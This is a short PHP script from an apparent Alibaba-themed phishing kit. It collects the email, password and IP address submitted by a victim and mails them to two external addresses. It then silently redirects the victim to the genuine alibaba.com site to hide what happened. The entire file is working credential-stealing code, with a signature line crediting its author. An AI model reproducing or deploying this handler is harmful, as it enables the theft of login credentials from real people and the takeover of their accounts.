<?php
$ip = getenv("REMOTE_ADDR");
$message .= "------***------ALiBaBa----***-----\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-------0------ By Shaun -----0---\n";

$send = "puzologs@gmail.com, salesdepartmental0147@hotmail.com";

$subject = "ALiBaBa";
$headers = "From: ALiBaBa";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://www.alibaba.com/");
	  

?>